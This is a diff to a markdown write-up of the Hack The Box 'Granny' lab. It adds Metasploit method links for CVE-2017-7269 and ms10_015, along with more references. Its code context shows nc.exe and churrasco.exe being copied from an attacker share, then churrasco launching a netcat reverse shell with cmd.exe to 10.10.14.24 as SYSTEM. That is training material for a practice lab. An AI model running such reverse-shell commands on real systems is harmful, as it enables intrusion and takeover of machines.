@@ -90,6 +90,10 @@ Check the solution [1](https://nimanthadeshappriya.medium.com/hack-the-box-grann
 Exploit poc links [1](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269) [2](https://github.com/c0d3cr4f73r/CVE-2017-7269)
 
 
+### Method 3: [CVE-2017-7269](https://www.exploit-db.com/exploits/41992) -> Metasploit Solution
+Check the solution [1](https://ethicalhacs.com/granny-hackthebox-walkthrough/)
+
+
 ## Privilege Escalation
 
 ### Method 1: MS15-051 [1](https://github.com/Re4son/Churrasco) / CVE:N/A [2](https://www.exploit-db.com/exploits/6705)
@@ -133,8 +137,12 @@ copy \\10.10.14.24\desktop\churrasco.exe
 
 copy \\10.10.14.24\win\nc.exe
 
+churrasco.exe
+
 churrasco.exe -d "C:\Inetpub\wwwroot\nc.exe 10.10.14.24 5555 -e cmd.exe"
 ```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/748c1463-7a7d-4396-a32a-a380802dd68b)
 
 Get the shell as **nt authority\system**, and read both user.txt flag and root.txt flag:
 
@@ -153,13 +161,18 @@ Check the solution [1](https://www.freecodecamp.org/news/keep-calm-and-hack-the-
 Metasploit module [1](https://www.rapid7.com/db/modules/exploit/windows/local/ms14_070_tcpip_ioctl/)
 
 
+### Method 4: ms10_015 -> Metasploit Solution
+Check the solution [1](https://ethicalhacs.com/granny-hackthebox-walkthrough/)
+
+
 # References & Alternatives
 + https://vvmlist.github.io/#Granny
 + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/granny-writeup-w-o-and-w-metasploit
 + https://0xdf.gitlab.io/2019/03/06/htb-granny.html
 + https://nimanthadeshappriya.medium.com/hack-the-box-granny-writeup-without-metasploit-864848ffffff
 + https://medium.com/@toneemarqus/granny-htb-manual-walkthrough-2023-tonee-183fb453e15b
-+ 
++ https://ethicalhacs.com/granny-hackthebox-walkthrough/
++ https://benheater.com/hackthebox-granny/
 
 
 ## CVE Scripting
@@ -169,6 +182,7 @@ Metasploit module [1](https://www.rapid7.com/db/modules/exploit/windows/local/ms
     + https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
 + **CVE-2017-7269:**
   + https://www.exploit-db.com/exploits/41738
+  + https://www.exploit-db.com/exploits/41992
     + https://nvd.nist.gov/vuln/detail/CVE-2017-7269
     + https://www.cvedetails.com/cve/CVE-2017-7269/
     + https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl/
@@ -206,8 +220,9 @@ Metasploit module [1](https://www.rapid7.com/db/modules/exploit/windows/local/ms
 
 ## For More
 + https://en.wikipedia.org/wiki/WebDAV
-+ https://en.wikipedia.org/wiki/Return-oriented_programming
++ https://kb.synology.com/en-my/DSM/help/WebDAVServer/webdav_server
 + https://www.ibm.com/docs/en/cognos-analytics/11.1.0?topic=services-configuring-webdav-iis
++ https://en.wikipedia.org/wiki/Return-oriented_programming
 + https://asfiyashaikh.medium.com/windows-privilege-escalation-using-sudo-su-ae5573feccd9
 + https://linux.die.net/man/1/cadaver
 
